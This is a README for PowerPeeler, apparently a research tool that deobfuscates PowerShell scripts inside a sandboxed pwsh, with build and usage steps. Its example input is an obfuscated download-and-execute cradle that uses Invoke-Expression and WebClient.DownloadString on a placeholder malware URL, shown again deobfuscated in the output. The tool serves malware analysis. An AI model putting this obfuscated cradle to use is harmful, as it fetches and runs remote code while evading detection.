# PowerPeeler

>A Precise and General Dynamic Deobfuscation Method for PowerShell Scripts

[中文版](README.zh-CN.md)



### Related resources

- conference paper: in coming

  conference-version code please switch to `paper-verion` branch
- full paper: [arxiv](https://arxiv.org/abs/2406.04027)



### Usage

1. Build environment requirement

   - base environment: refer to [PowerShell official build instruction](https://github.com/PowerShell/PowerShell#building-the-repository)
   - .net core 7.0.101
   - pwsh/powershell

2. Runtime environment

   - PSScriptAnalyzer(optional, for code formatting)
   - [Invoke-Deobfuscation](https://gitee.com/snowroll/invoke-deobfuscation)(optional, static and dynamic combination)

3. Get the tool

   ```bash
   git clone https://github.com/zhengbili/PowerPeeler
   ```

   Or

   ```bash
   git clone https://gitee.com/snowroll/powerpeeler
   ```

4. Compile sandbox

   ```powershell
   cd PowerPeeler
   pwsh ./build.ps1
   ```

5. Tool usage

   1. Change the directory to prevent some malicious scripts from polluting the current directory: ```cd sandbox```
   2. Enter special pwsh environments: ```../pwsh```
   3. Execute anti-obfuscation scripts in the special pwsh environment

   ```powershell
   ../Deobfuscation/deob.ps1 --SettingType [Simple|Analysis|SemanticAnalysis]  --InputPath InputFileLocation --OutputPath OutputFileLocation [-cmd] [-log]
   ```
   ​	```-st --SettingType```	deobfuscation mode, with several presets, the code can be modified yourself
   ​	```-ip --InputPath```	input file location
   ​	```-op --OutputPath```	output file location
   ​	```-cmd --IsCmd```	cmd one-line mode
   ​	```-log --SaveLog```	save log



### Example

```../pwsh ../Deobfuscation/deob.ps1 -ip in.ps1 -op out.ps1```

- in.ps1

  ```powershell
  Ie`X ("{2}{0}{1}" -f 'ost h', 'ello', 'write-h')
  $xdjmd  =   'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG'
  $lsffs =   '8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA='
  $sdfs = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($xdjmd + $lsffs))
  .($psHoME[4]+$PShOmE[30]+'x') (Ne`W-oB`JeCt Net.Web`C`lient).downloadstring($sdfs)
  ```

- out.ps1

  ```
  Write-Host ([string]'hello')
  $xdjmd = ([string]'aAB0AHQAcABzADoALwAvAHQAZQBzAHQALgBjAG')
  $lsffs = ([string]'8AbQAvAG0AYQBsAHcAYQByAGUALgB0AHgAdAA=')
  $sdfs = ([string]'https://test.com/malware.txt')
  .'Invoke-Expression' (New-Object ([string]'Net.WebClient')).DownloadString(([string]'https://test.com/malware.txt'))
  ```



### Citation format

```
@misc{li2024powerpeelerprecisegeneraldynamic,
      title={PowerPeeler: A Precise and General Dynamic Deobfuscation Method for PowerShell Scripts}, 
      author={Ruijie Li and Chenyang Zhang and Huajun Chai and Lingyun Ying and Haixin Duan and Jun Tao},
      year={2024},
      eprint={2406.04027},
      archivePrefix={arXiv},
      primaryClass={cs.CR},
      url={https://arxiv.org/abs/2406.04027}, 
}
```



